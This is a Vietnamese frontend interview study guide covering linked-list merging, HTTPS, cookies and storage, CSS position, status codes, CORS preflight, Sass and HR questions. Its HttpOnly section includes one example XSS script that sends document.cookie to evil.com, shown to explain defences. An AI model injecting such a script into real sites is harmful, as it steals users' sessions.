# Interview Three Side — Deep Dive

> 📅 2026-02-14 · ⏱ 18 phút đọc
>
> Merge Sorted Linked Lists, HTTPS vs HTTP, Cookie Attributes,
> Cookie vs Session vs Storage, HttpOnly, CSS Position,
> HTTP Status Codes, OPTIONS Method, Less & Sass, HR Questions
> Độ khó: ⭐️⭐️⭐️⭐️ | Frontend Interview Round 3

---

## Mục Lục

| #   | Phần                                                |
| --- | --------------------------------------------------- |
| 1   | Algorithm: Merge 2 Sorted Linked Lists              |
| 2   | HTTPS vs HTTP                                       |
| 3   | Cookie Attributes                                   |
| 4   | Cookie vs Session vs LocalStorage vs SessionStorage |
| 5   | Ngăn JavaScript truy cập Cookie                     |
| 6   | CSS Position — Các thuộc tính                       |
| 7   | HTTP Status Codes                                   |
| 8   | OPTIONS Request Method                              |
| 9   | Less & Sass — Chức năng                             |
| 10  | HR Questions — Câu hỏi hành vi                      |

---

## §1. Algorithm: Merge 2 Sorted Linked Lists

```
BÀI TOÁN (LeetCode 21):
═══════════════════════════════════════════════════════════════

  Input:  list1 = 1 → 2 → 4
          list2 = 1 → 3 → 4

  Output: 1 → 1 → 2 → 3 → 4 → 4

  → Merge 2 linked lists ĐÃ SẮP XẾP thành 1 linked list SẮP XẾP!
```

```javascript
// ═══ ĐỊNH NGHĨA NODE ═══

class ListNode {
  constructor(val = 0, next = null) {
    this.val = val;
    this.next = next;
  }
}
```

```javascript
// ═══ CÁCH 1: ITERATIVE (Dùng Dummy Node!) ═══

function mergeTwoLists(list1, list2) {
  // Dummy node = node GIẢ ở đầu → dễ xử lý!
  const dummy = new ListNode(-1);
  let current = dummy;

  while (list1 !== null && list2 !== null) {
    if (list1.val <= list2.val) {
      current.next = list1; // Nối node nhỏ hơn!
      list1 = list1.next; // Di chuyển list1!
    } else {
      current.next = list2;
      list2 = list2.next;
    }
    current = current.next; // Di chuyển current!
  }

  // Nối phần CÒN LẠI (1 list đã hết!):
  current.next = list1 !== null ? list1 : list2;

  return dummy.next; // Bỏ dummy, trả từ node thật đầu tiên!
}

// VÍ DỤ TỪNG BƯỚC:
// list1: 1 → 2 → 4
// list2: 1 → 3 → 4
// dummy: -1
//
// Vòng 1: 1(L1) <= 1(L2) → nối L1(1)  → dummy: -1→1
//          list1 = 2→4
// Vòng 2: 2(L1) > 1(L2)  → nối L2(1)  → dummy: -1→1→1
//          list2 = 3→4
// Vòng 3: 2(L1) <= 3(L2) → nối L1(2)  → dummy: -1→1→1→2
//          list1 = 4
// Vòng 4: 4(L1) > 3(L2)  → nối L2(3)  → dummy: -1→1→1→2→3
//          list2 = 4
// Vòng 5: 4(L1) <= 4(L2) → nối L1(4)  → dummy: -1→1→1→2→3→4
//          list1 = null → THOÁT while!
// Còn lại: list2 = 4 → nối! → dummy: -1→1→1→2→3→4→4
//
// Return dummy.next = 1→1→2→3→4→4 ✅
```

```javascript
// ═══ CÁCH 2: ĐỆ QUY ═══

function mergeTwoListsRecursive(list1, list2) {
  // Base cases:
  if (!list1) return list2; // list1 hết → trả list2!
  if (!list2) return list1; // list2 hết → trả list1!

  if (list1.val <= list2.val) {
    // list1 nhỏ hơn → giữ node list1 → merge PHẦN CÒN LẠI!
    list1.next = mergeTwoListsRecursive(list1.next, list2);
    return list1;
  } else {
    list2.next = mergeTwoListsRecursive(list1, list2.next);
    return list2;
  }
}

// ĐỆ QUY FLOW:
// merge(1→2→4, 1→3→4)
//   1 <= 1 → 1.next = merge(2→4, 1→3→4)
//               2 > 1 → 1.next = merge(2→4, 3→4)
//                          2 <= 3 → 2.next = merge(4, 3→4)
//                                     4 > 3 → 3.next = merge(4, 4)
//                                               4 <= 4 → 4.next = merge(null, 4)
//                                                          return 4
//                                               return 4→4
//                                     return 3→4→4
//                          return 2→3→4→4
//               return 1→2→3→4→4
//   return 1→1→2→3→4→4 ✅
```

```
ĐỘ PHỨC TẠP:
═══════════════════════════════════════════════════════════════

  ITERATIVE:
  → Time:  O(n + m) — duyệt hết cả 2 lists!
  → Space: O(1)     — chỉ dùng dummy + current pointer!

  ĐỆ QUY:
  → Time:  O(n + m)
  → Space: O(n + m) — call stack! ⚠️

  ⚠️ PHỎNG VẤN: ĐỀ XUẤT iterative trước (space O(1)!)
  → Hỏi thêm → viết đệ quy (ngắn gọn, elegant!)

  KEY INSIGHT: DUMMY NODE PATTERN!
  → Tạo node giả ở đầu → không cần xử lý edge case head!
  → Cuối cùng return dummy.next!
  → Pattern này DÙNG RẤT NHIỀU trong linked list problems!
```

---

## §2. HTTPS vs HTTP

```
HTTPS vs HTTP — TỔNG HỢP:
═══════════════════════════════════════════════════════════════

  ┌─────────────────┬──────────────────┬──────────────────────┐
  │ Tiêu chí        │ HTTP             │ HTTPS                 │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Full name       │ HyperText        │ HyperText Transfer   │
  │                 │ Transfer Protocol│ Protocol SECURE       │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Port            │ 80               │ 443                   │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Bảo mật         │ Plain text! ❌   │ SSL/TLS mã hóa! ✅   │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Certificate     │ Không cần        │ CẦN SSL Certificate!  │
  │                 │                  │ CA (Certificate Auth.) │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Tốc độ          │ Nhanh hơn        │ Chậm hơn chút        │
  │                 │ (no encryption)  │ (TLS handshake!)      │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ SEO             │ Bình thường      │ Google ƯU TIÊN! ⭐    │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Mã hóa          │ Không            │ Asymmetric + Symmetric│
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Man-in-Middle   │ Dễ bị tấn công!  │ Được bảo vệ! ✅       │
  └─────────────────┴──────────────────┴──────────────────────┘

  TLS HANDSHAKE (nhắc lại ngắn gọn):
  ① Client Hello → TLS version, cipher suites, Client Random
  ② Server Hello → chọn cipher, gửi Certificate (Public Key) + Server Random
  ③ Client verify Certificate → tạo Pre-Master Secret → encrypt bằng Public Key → gửi
  ④ Server decrypt bằng Private Key → cả 2 tạo Session Key (symmetric!)
  ⑤ Giao tiếp bằng Session Key (AES, nhanh!)

  TẠI SAO 2 LOẠI MÃ HÓA?
  → Asymmetric (RSA): AN TOÀN nhưng CHẬM → chỉ trao đổi key!
  → Symmetric (AES): NHANH → dùng cho toàn bộ data!
```

---

## §3. Cookie Attributes

```
COOKIE ATTRIBUTES — ĐẦY ĐỦ:
═══════════════════════════════════════════════════════════════

  Set-Cookie: session_id=abc123; Domain=.example.com;
              Path=/; Expires=...; Max-Age=3600;
              Secure; HttpOnly; SameSite=Strict

  ┌─────────────────┬────────────────────────────────────────┐
  │ Attribute       │ Ý nghĩa                                │
  ├─────────────────┼────────────────────────────────────────┤
  │ Name=Value      │ Tên và giá trị cookie!                 │
  │                 │ VD: session_id=abc123                  │
  ├─────────────────┼────────────────────────────────────────┤
  │ Domain          │ Domain NÀO được nhận cookie!           │
  │                 │ .example.com → bao gồm subdomains!    │
  │                 │ Mặc định: CHÍNH XÁC domain set cookie!│
  ├─────────────────┼────────────────────────────────────────┤
  │ Path            │ Path NÀO gửi cookie!                   │
  │                 │ Path=/ → tất cả paths!                 │
  │                 │ Path=/admin → chỉ /admin và sub-paths! │
  ├─────────────────┼────────────────────────────────────────┤
  │ Expires         │ Thời điểm HẾT HẠN (absolute date!)    │
  │                 │ Expires=Thu, 14 Feb 2027 00:00:00 GMT  │
  │                 │ Không set → Session cookie! (đóng tab =│
  │                 │ mất!)                                  │
  ├─────────────────┼────────────────────────────────────────┤
  │ Max-Age         │ Thời gian SỐNG (giây!) ƯU TIÊN hơn    │
  │                 │ Expires!                               │
  │                 │ Max-Age=3600 → sống 1 giờ!             │
  │                 │ Max-Age=0 → XÓA cookie ngay!           │
  ├─────────────────┼────────────────────────────────────────┤
  │ Secure          │ CHỈ gửi qua HTTPS! ❌ HTTP!            │
  │                 │ Bảo vệ khỏi bị đánh cắp trên          │
  │                 │ unencrypted connections!                │
  ├─────────────────┼────────────────────────────────────────┤
  │ HttpOnly        │ JavaScript KHÔNG truy cập được! 🔒     │
  │                 │ document.cookie → KHÔNG thấy!          │
  │                 │ Chống XSS đánh cắp cookies!            │
  ├─────────────────┼────────────────────────────────────────┤
  │ SameSite        │ CHỐNG CSRF attacks!                    │
  │                 │ Strict: KHÔNG gửi cross-site!          │
  │                 │ Lax: gửi cho top-level navigations!    │
  │                 │ None: gửi tất cả (CẦN Secure!)        │
  └─────────────────┴────────────────────────────────────────┘

  PHÂN LOẠI COOKIE:
  → Session Cookie: không có Expires/Max-Age → đóng browser = mất!
  → Persistent Cookie: có Expires/Max-Age → tồn tại sau đóng browser!
  → Secure Cookie: Secure flag → chỉ HTTPS!
  → HttpOnly Cookie: HttpOnly flag → JS không truy cập!
  → Third-party Cookie: Domain KHÁC domain hiện tại (tracking!) → đang bị
    browsers CHẶN dần!
```

---

## §4. Cookie vs Session vs LocalStorage vs SessionStorage

```
4 CƠ CHẾ LƯU TRỮ — SO SÁNH:
═══════════════════════════════════════════════════════════════

  ┌─────────────┬──────────┬──────────┬────────────┬──────────────┐
  │ Tiêu chí    │ Cookie   │ Session  │ Local-     │ Session-     │
  │             │          │ (Server!)│ Storage    │ Storage      │
  ├─────────────┼──────────┼──────────┼────────────┼──────────────┤
  │ Lưu ở đâu? │ Client   │ SERVER!  │ Client     │ Client       │
  │             │ (browser)│          │ (browser)  │ (browser)    │
  ├─────────────┼──────────┼──────────┼────────────┼──────────────┤
  │ Dung lượng  │ ~4KB!    │ Tùy     │ ~5-10MB!   │ ~5-10MB!     │
  │             │ Rất nhỏ! │ server!  │ Lớn!       │ Lớn!         │
  ├─────────────┼──────────┼──────────┼────────────┼──────────────┤
  │ Gửi kèm    │ TỰ ĐỘNG  │ Session  │ ❌ KHÔNG!  │ ❌ KHÔNG!    │
  │ request?    │ mỗi HTTP │ ID qua  │ Phải tự    │ Phải tự      │
  │             │ request! │ cookie!  │ gửi!       │ gửi!         │
  ├─────────────┼──────────┼──────────┼────────────┼──────────────┤
  │ Lifetime    │ Expires/ │ Tùy     │ VĨNH VIỄN! │ Đóng TAB     │
  │             │ Max-Age  │ config! │ Xóa thủ    │ → MẤT!       │
  │             │ hoặc     │         │ công!      │              │
  │             │ session! │         │            │              │
  ├─────────────┼──────────┼──────────┼────────────┼──────────────┤
  │ JS access   │ document │ KHÔNG!  │ localStorage│sessionStorage│
  │             │ .cookie  │ Server  │ .getItem() │ .getItem()   │
  │             │ (trừ     │ side!   │            │              │
  │             │ HttpOnly)│         │            │              │
  ├─────────────┼──────────┼──────────┼────────────┼──────────────┤
  │ Scope       │ Domain + │ Server  │ SAME ORIGIN│ SAME ORIGIN  │
  │             │ Path     │ session │ Chia sẻ    │ + SAME TAB!  │
  │             │          │         │ ALL TABS!  │ Mỗi tab riêng│
  ├─────────────┼──────────┼──────────┼────────────┼──────────────┤
  │ Dùng cho    │ Auth,    │ Login   │ User prefs,│ Form data    │
  │             │ tracking │ state,  │ cache data,│ tạm, wizard  │
  │             │          │ cart    │ offline!   │ steps!       │
  └─────────────┴──────────┴──────────┴────────────┴──────────────┘

  ⚠️ KHÁC BIỆT QUAN TRỌNG:
  → Cookie: GỬI KÈM MỖI REQUEST! → ảnh hưởng bandwidth!
  → LocalStorage: VĨNH VIỄN + chia sẻ GIỮA TABS!
  → SessionStorage: MẤT khi đóng tab + RIÊNG MỖI TAB!
  → Session (server): an toàn hơn, data ở server!
```

---

## §5. Ngăn JavaScript truy cập Cookie

```
NGĂN JS TRUY CẬP COOKIE — HttpOnly:
═══════════════════════════════════════════════════════════════

  CƠ CHẾ: Set flag HttpOnly trong Set-Cookie header!

  // Server response:
  Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict

  → JavaScript KHÔNG THỂ truy cập cookie này!
  → document.cookie KHÔNG liệt kê cookie HttpOnly!
  → XSS attack KHÔNG đánh cắp được!

  KHÔNG CÓ HttpOnly:
  ┌────────────────────────────────────────────────────────┐
  │ // Attacker inject XSS:                                │
  │ <script>                                               │
  │   fetch('https://evil.com?cookie=' + document.cookie); │
  │ </script>                                              │
  │ → ĐỌC ĐƯỢC document.cookie! → Đánh cắp session! 💀   │
  └────────────────────────────────────────────────────────┘

  CÓ HttpOnly:
  ┌────────────────────────────────────────────────────────┐
  │ document.cookie → KHÔNG thấy session_id!               │
  │ → XSS KHÔNG đánh cắp được! ✅                          │
  │ → Cookie CHỈ gửi tự động qua HTTP requests!           │
  │ → Server ĐỌC bình thường!                              │
  └────────────────────────────────────────────────────────┘

  BỔ SUNG — CHỐNG XSS TOÀN DIỆN:
  → HttpOnly: chống đánh cắp cookie!
  → CSP header: Content-Security-Policy: script-src 'self'
    → Chặn inline scripts!
  → Sanitize input/output: escape HTML entities!
  → Secure + SameSite: chống CSRF + chỉ HTTPS!
```

---

## §6. CSS Position — Các thuộc tính

```
CSS POSITION — 5 GIÁ TRỊ:
═══════════════════════════════════════════════════════════════

  ┌─────────────┬────────────────────────────────────────────┐
  │ ① static    │ MẶC ĐỊNH! Theo document flow bình thường! │
  │             │ top/right/bottom/left KHÔNG có tác dụng!  │
  │             │ z-index KHÔNG có tác dụng!                │
  └─────────────┘────────────────────────────────────────────┘

  ┌─────────────┬────────────────────────────────────────────┐
  │ ② relative  │ Định vị TƯƠNG ĐỐI so với VỊ TRÍ GỐC!     │
  │             │ → Vẫn CHIẾM CHỖ trong document flow!      │
  │             │ → top: 10px → dịch xuống 10px từ vị trí gốc│
  │             │ → Không ảnh hưởng elements khác!           │
  │             │ → Thường dùng làm CONTAINING BLOCK         │
  │             │   cho absolute children!                   │
  └─────────────┘────────────────────────────────────────────┘

  ┌─────────────┬────────────────────────────────────────────┐
  │ ③ absolute  │ Định vị so với ANCESTOR có position ≠ static│
  │             │ → RỜI document flow! KHÔNG chiếm chỗ!     │
  │             │ → Tìm ancestor: relative/absolute/fixed/   │
  │             │   sticky → nếu không tìm thấy → viewport! │
  │             │ → top/left/right/bottom so với ancestor!   │
  └─────────────┘────────────────────────────────────────────┘

  ┌─────────────┬────────────────────────────────────────────┐
  │ ④ fixed     │ Định vị so với VIEWPORT (cửa sổ trình     │
  │             │ duyệt!)                                   │
  │             │ → RỜI document flow!                       │
  │             │ → KHÔNG di chuyển khi SCROLL!              │
  │             │ → Dùng cho: navbar cố định, FAB button,   │
  │             │   modal backdrop!                          │
  └─────────────┘────────────────────────────────────────────┘

  ┌─────────────┬────────────────────────────────────────────┐
  │ ⑤ sticky    │ KẾT HỢP relative + fixed!                 │
  │             │ → Bình thường: relative (theo flow!)       │
  │             │ → Scroll đến threshold: DÍNH lại (fixed!)  │
  │             │ → CẦN ít nhất 1 trong top/bottom/left/right│
  │             │ → VD: sticky header → top: 0 → dính đầu   │
  │             │   trang khi scroll qua!                    │
  └─────────────┘────────────────────────────────────────────┘
```

```css
/* ═══ VÍ DỤ THỰC TẾ ═══ */

/* Sticky header: */
.header {
  position: sticky;
  top: 0;
  z-index: 100;
  background: white;
}

/* Modal overlay: */
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.5);
  z-index: 1000;
}

/* Tooltip: */
.tooltip-container {
  position: relative; /* Containing block! */
}
.tooltip {
  position: absolute;
  bottom: 100%;
  left: 50%;
  transform: translateX(-50%);
}

/* ⚠️ STACKING CONTEXT:
   → position != static + z-index → tạo stacking context MỚI!
   → z-index CHỈ có tác dụng trên positioned elements!
   → (trừ flex/grid children → z-index cũng hoạt động!)
*/
```

---

## §7. HTTP Status Codes

```
HTTP STATUS CODES — PHÂN LOẠI:
═══════════════════════════════════════════════════════════════

  ┌─────┬───────────────────────────────────────────────────┐
  │ 1xx │ INFORMATIONAL — Đang xử lý!                       │
  ├─────┼───────────────────────────────────────────────────┤
  │ 100 │ Continue — client tiếp tục gửi body!              │
  │ 101 │ Switching Protocols — chuyển sang WebSocket!       │
  └─────┴───────────────────────────────────────────────────┘

  ┌─────┬───────────────────────────────────────────────────┐
  │ 2xx │ SUCCESS — Thành công!                              │
  ├─────┼───────────────────────────────────────────────────┤
  │ 200 │ OK — Request thành công!                           │
  │ 201 │ Created — Tạo resource mới thành công! (POST!)     │
  │ 204 │ No Content — Thành công nhưng KHÔNG có body!       │
  │     │ (DELETE thường trả 204!)                          │
  └─────┴───────────────────────────────────────────────────┘

  ┌─────┬───────────────────────────────────────────────────┐
  │ 3xx │ REDIRECTION — Chuyển hướng!                        │
  ├─────┼───────────────────────────────────────────────────┤
  │ 301 │ Moved Permanently — URL MỚI vĩnh viễn!            │
  │     │ → Browser cache redirect! SEO chuyển!              │
  │ 302 │ Found — Redirect TẠM THỜI! (method có thể đổi!)   │
  │ 304 │ Not Modified — Tài nguyên CHƯA THAY ĐỔI!          │
  │     │ → Dùng cache! Không tải lại! (ETag/Last-Modified!)│
  │ 307 │ Temporary Redirect — Như 302 nhưng GIỮ method!     │
  │ 308 │ Permanent Redirect — Như 301 nhưng GIỮ method!     │
  └─────┴───────────────────────────────────────────────────┘

  ┌─────┬───────────────────────────────────────────────────┐
  │ 4xx │ CLIENT ERROR — Lỗi từ client!                      │
  ├─────┼───────────────────────────────────────────────────┤
  │ 400 │ Bad Request — Request sai format / thiếu params!   │
  │ 401 │ Unauthorized — CHƯA xác thực! Cần login!          │
  │ 403 │ Forbidden — ĐÃ xác thực nhưng KHÔNG có quyền!    │
  │ 404 │ Not Found — Resource KHÔNG tồn tại!                │
  │ 405 │ Method Not Allowed — Method không được phép!       │
  │ 409 │ Conflict — Xung đột! (VD: duplicate resource!)    │
  │ 413 │ Payload Too Large — Body quá lớn!                  │
  │ 429 │ Too Many Requests — Rate limiting! Quá nhiều request│
  └─────┴───────────────────────────────────────────────────┘

  ┌─────┬───────────────────────────────────────────────────┐
  │ 5xx │ SERVER ERROR — Lỗi server!                         │
  ├─────┼───────────────────────────────────────────────────┤
  │ 500 │ Internal Server Error — Lỗi server chung!          │
  │ 502 │ Bad Gateway — Proxy/gateway nhận response sai!     │
  │ 503 │ Service Unavailable — Server quá tải / bảo trì!    │
  │ 504 │ Gateway Timeout — Proxy/gateway timeout!           │
  └─────┴───────────────────────────────────────────────────┘

  ⚠️ PHỎNG VẤN HAY HỎI:
  → 401 vs 403: 401 = CHƯA login; 403 = ĐÃ login nhưng KHÔNG QUYỀN!
  → 301 vs 302: 301 = VĨNH VIỄN (SEO!); 302 = TẠM THỜI!
  → 304: NOT MODIFIED → dùng cache! Không download lại!
```

---

## §8. OPTIONS Request Method

```
OPTIONS METHOD — MỤC ĐÍCH:
═══════════════════════════════════════════════════════════════

  ① HỎI SERVER HỖ TRỢ GÌ:
  → Client gửi OPTIONS → server trả về methods, headers được phép!

  ② CORS PREFLIGHT REQUEST (CHÍNH!):
  ┌────────────────────────────────────────────────────────┐
  │ Browser TỰ ĐỘNG gửi OPTIONS TRƯỚC request thật!       │
  │                                                        │
  │ KHI NÀO BROWSER GỬI PREFLIGHT?                        │
  │ → Method KHÔNG phải GET/HEAD/POST!                     │
  │ → Hoặc Content-Type KHÔNG phải:                        │
  │   text/plain, multipart/form-data, application/x-www-  │
  │   form-urlencoded!                                     │
  │ → Hoặc có Custom headers (Authorization, X-Custom...)! │
  │                                                        │
  │ FLOW:                                                  │
  │ ┌────────┐  ① OPTIONS /api/data              ┌────────┐│
  │ │Browser │  ────────────────────────────→     │ Server ││
  │ │        │  Origin: https://frontend.com      │        ││
  │ │        │  Access-Control-Request-Method: PUT │        ││
  │ │        │  Access-Control-Request-Headers:    │        ││
  │ │        │  Content-Type, Authorization        │        ││
  │ │        │                                     │        ││
  │ │        │  ② 204 No Content                  │        ││
  │ │        │  ←────────────────────────────      │        ││
  │ │        │  Access-Control-Allow-Origin: *     │        ││
  │ │        │  Access-Control-Allow-Methods:      │        ││
  │ │        │  GET, POST, PUT                     │        ││
  │ │        │  Access-Control-Allow-Headers:      │        ││
  │ │        │  Content-Type, Authorization        │        ││
  │ │        │  Access-Control-Max-Age: 86400      │        ││
  │ │        │                                     │        ││
  │ │        │  ③ PUT /api/data (REQUEST THẬT!)   │        ││
  │ │        │  ────────────────────────────→     │        ││
  │ └────────┘                                     └────────┘│
  └────────────────────────────────────────────────────────┘

  Access-Control-Max-Age: 86400
  → Cache preflight 24 giờ! Không gửi OPTIONS lại!

  ⚠️ SIMPLE REQUESTS KHÔNG CẦN PREFLIGHT:
  → GET/HEAD/POST + standard headers + standard Content-Types!
```

---

## §9. Less & Sass — Chức năng

```
LESS & SASS — CSS PREPROCESSORS:
═══════════════════════════════════════════════════════════════

  CSS Preprocessor = EXTEND CSS với tính năng lập trình!
  → Viết code → COMPILE thành CSS thuần!

  ┌─────────────────┬──────────────────┬──────────────────────┐
  │ Tính năng        │ Less             │ Sass/SCSS             │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Biến            │ @color: #333;    │ $color: #333;         │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Nesting         │ ✅ Giống nhau!   │ ✅ Giống nhau!        │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Mixins          │ .mixin() { }     │ @mixin name() { }    │
  │                 │ .mixin();        │ @include name();     │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Extend          │ &:extend(.class) │ @extend .class;      │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Functions       │ Built-in!        │ Built-in + @function!│
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Control flow    │ when (guard!)    │ @if/@for/@each/@while│
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Import          │ @import          │ @use/@forward (mới!) │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Runtime         │ JS (browser/Node)│ Dart (dart-sass!)    │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │ Phổ biến        │ Bootstrap 3      │ Bootstrap 4+, Angular│
  └─────────────────┴──────────────────┴──────────────────────┘
```

```scss
// ═══ CÁC TÍNH NĂNG CHÍNH ═══

// ① BIẾN — tái sử dụng giá trị!
$primary: #007bff;
$spacing: 16px;
$font-stack: "Inter", sans-serif;

.button {
  background: $primary;
  padding: $spacing;
  font-family: $font-stack;
}

// ② NESTING — viết CSS lồng nhau (dễ đọc!)
.nav {
  background: white;
  ul {
    list-style: none;
    li {
      display: inline;
      a {
        color: $primary;
        &:hover {
          color: darken($primary, 10%);
        }
        // & = parent selector = .nav ul li a
      }
    }
  }
}

// ③ MIXINS — tái sử dụng block CSS!
@mixin flex-center {
  display: flex;
  justify-content: center;
  align-items: center;
}

@mixin responsive($breakpoint) {
  @if $breakpoint == mobile {
    @media (max-width: 768px) {
      @content;
    }
  }
}

.card {
  @include flex-center; // Dùng mixin!
  @include responsive(mobile) {
    flex-direction: column;
  }
}

// ④ EXTEND — thừa kế styles!
%button-base {
  padding: 10px 20px;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

.btn-primary {
  @extend %button-base;
  background: blue;
}
.btn-danger {
  @extend %button-base;
  background: red;
}

// ⑤ FUNCTIONS — tính toán!
@function spacing($multiplier) {
  @return $multiplier * 8px;
}

.container {
  padding: spacing(2); // 16px!
  margin: spacing(3); // 24px!
}

// ⑥ LOOPS — lặp!
@for $i from 1 through 5 {
  .mt-#{$i} {
    margin-top: $i * 8px;
  }
}
// Sinh ra: .mt-1 { margin-top: 8px } ... .mt-5 { margin-top: 40px }
```

```
LESS/SASS vs CSS THUẦN:
═══════════════════════════════════════════════════════════════

  CSS THUẦN (hiện đại) ĐÃ CÓ:
  → CSS Variables: --primary: #007bff; var(--primary)
  → Nesting: .nav { ul { } } (CSS Nesting mới!)
  → @layer, @container queries!

  NHƯNG SASS VẪN CÓ ƯU THẾ:
  → Mixins + Functions + Loops → CSS KHÔNG có!
  → Extend/inheritance → CSS KHÔNG có!
  → @use/@forward → module system mạnh hơn!
  → Ecosystem: lớn, nhiều libraries dùng Sass!
```

---

## §10. HR Questions — Câu hỏi hành vi

```
HR QUESTIONS — FRAMEWORK TRẢ LỜI:
═══════════════════════════════════════════════════════════════

  ① "HỌC FRONTEND NHƯ THẾ NÀO?"
  ┌────────────────────────────────────────────────────────┐
  │ → Official docs: MDN, React docs, TypeScript handbook  │
  │ → Hands-on projects: build real apps, open-source!     │
  │ → Community: tech blogs (ByteDance, Google), conferences│
  │ → Source code: đọc source libraries (React, Vue!)      │
  │ → Chia sẻ: viết blog, mentor juniors!                  │
  │                                                        │
  │ ⚠️ TIPS:                                               │
  │ → Nói CỤ THỂ: "Tôi đọc React source code để hiểu     │
  │   fiber architecture" chứ KHÔNG "tôi xem tutorial"     │
  │ → Thể hiện ĐAM MÊ + TỰ HỌC + ĐÀO SÂU!              │
  └────────────────────────────────────────────────────────┘

  ② "BẮT ĐẦU LÀM FRONTEND TỪ KHI NÀO?"
  ┌────────────────────────────────────────────────────────┐
  │ → Kể câu chuyện CHÂN THỰC!                             │
  │ → Milestone: first website, first framework, first job│
  │ → Thể hiện HÀNH TRÌNH PHÁT TRIỂN!                     │
  │ → "Tôi bắt đầu từ HTML/CSS đơn giản, rồi tìm hiểu    │
  │   JavaScript, React, và hiện đang đào sâu vào          │
  │   performance optimization và system design"           │
  └────────────────────────────────────────────────────────┘

  ③ "KẾ HOẠCH TƯƠNG LAI?"
  ┌────────────────────────────────────────────────────────┐
  │ → Ngắn hạn (6 tháng): master tech X, contribute project│
  │ → Trung hạn (1-2 năm): senior level, lead features     │
  │ → Dài hạn: tech lead, architecture, mentoring          │
  │                                                        │
  │ ⚠️ GẮN với CÔNG TY: "Tôi muốn phát triển trong        │
  │   lĩnh vực X mà công ty đang mạnh"                    │
  │ ⚠️ TRÁNH: "Tôi muốn startup riêng" → HR lo bạn đi!   │
  └────────────────────────────────────────────────────────┘

  ④ "DỰ ÁN ẤN TƯỢNG NHẤT? KHÓ KHĂN?"
  ┌────────────────────────────────────────────────────────┐
  │ → Dùng STAR method (xem §1 Interview Two Side!)        │
  │ → Chọn dự án PHỨC TẠP nhất!                            │
  │ → Nói rõ: vấn đề GÌ, bạn làm GÌ, kết quả GÌ!        │
  │ → VD: "Dự án dashboard realtime:                       │
  │   - Khó: render 10K data points mượt                   │
  │   - Giải pháp: virtualization + Web Workers +           │
  │     Canvas rendering                                   │
  │   - Kết quả: 60fps, giảm memory 70%"                  │
  └────────────────────────────────────────────────────────┘

  ⑤ "BẠN BIẾT GÌ VỀ CÔNG TY?"
  ┌────────────────────────────────────────────────────────┐
  │ → RESEARCH TRƯỚC! Sản phẩm, văn hóa, tech stack!      │
  │ → Nói CỤ THỂ: "Tôi biết công ty đang phát triển       │
  │   platform X, dùng React + Node.js, và tôi rất         │
  │   hứng thú với challenge Y"                            │
  │ → Thể hiện BẠN ĐÃ TÌM HIỂU, không chỉ apply đại!     │
  └────────────────────────────────────────────────────────┘

  ⑥ "KHI NÀO BẮT ĐẦU? THỰC TẬP BAO LÂU?"
  ┌────────────────────────────────────────────────────────┐
  │ → Trả lời THÀNH THẬT!                                  │
  │ → Linh hoạt: "Tôi có thể bắt đầu ngay / sau 2 tuần"  │
  │ → Thời gian: "Tôi mong muốn ít nhất 3-6 tháng để      │
  │   đóng góp ý nghĩa cho team"                          │
  │ → Thể hiện CAM KẾT lâu dài!                           │
  └────────────────────────────────────────────────────────┘
```

---

## Tổng kết — Checklist phỏng vấn

```
MIND MAP:
═══════════════════════════════════════════════════════════════

  Interview Three Side
  ├── Merge Sorted Lists: dummy node pattern! Iterative O(1) space!
  ├── HTTPS vs HTTP: SSL/TLS, port 443/80, TLS handshake 5 bước!
  ├── Cookie Attributes: Domain, Path, Expires, Max-Age, Secure,
  │   HttpOnly, SameSite (Strict/Lax/None!)
  ├── Storage comparison: Cookie (4KB, auto-send!), Session (server!),
  │   LocalStorage (5MB, permanent!), SessionStorage (tab-scoped!)
  ├── HttpOnly: JS KHÔNG truy cập, chống XSS đánh cắp cookie!
  ├── CSS Position: static/relative/absolute/fixed/sticky
  │   └── absolute → nearest positioned ancestor!
  ├── Status Codes: 2xx success, 3xx redirect, 4xx client error, 5xx server!
  │   └── 401=chưa login, 403=không quyền, 301=permanent, 302=temporary!
  ├── OPTIONS: CORS preflight! Browser tự gửi trước non-simple requests!
  ├── Less & Sass: Variables, Nesting, Mixins, Extend, Functions, Loops!
  └── HR Questions: STAR method, cụ thể, cam kết, research công ty!
```

### Checklist

- [ ] **Merge Sorted Lists**: Dummy node pattern! while(l1 && l2) so sánh val → nối nhỏ hơn; cuối nối phần còn lại; Time O(n+m) Space O(1)!
- [ ] **Đệ quy merge**: Base case (!l1 return l2, !l2 return l1); so sánh val → đệ quy next; Space O(n+m) call stack!
- [ ] **HTTPS**: HTTP + SSL/TLS; port 443; Asymmetric (RSA) trao đổi key + Symmetric (AES) cho data!
- [ ] **Cookie attributes 7 cái**: Name=Value, Domain, Path, Expires/Max-Age, Secure (HTTPS only!), HttpOnly (no JS!), SameSite (CSRF!)
- [ ] **Cookie types**: Session (no Expires), Persistent (có Expires), Third-party (tracking, đang bị chặn!)
- [ ] **4 loại storage**: Cookie (4KB, auto HTTP), Session (server-side), LocalStorage (5-10MB, permanent, all tabs), SessionStorage (5-10MB, tab-scoped, đóng tab=mất!)
- [ ] **HttpOnly**: Set-Cookie flag; document.cookie KHÔNG thấy; chống XSS đánh cắp session! Bổ sung: CSP + sanitize input!
- [ ] **CSS Position 5 values**: static (default), relative (offset từ vị trí gốc, vẫn chiếm chỗ), absolute (rời flow, so với positioned ancestor), fixed (viewport, không scroll), sticky (relative+fixed!)
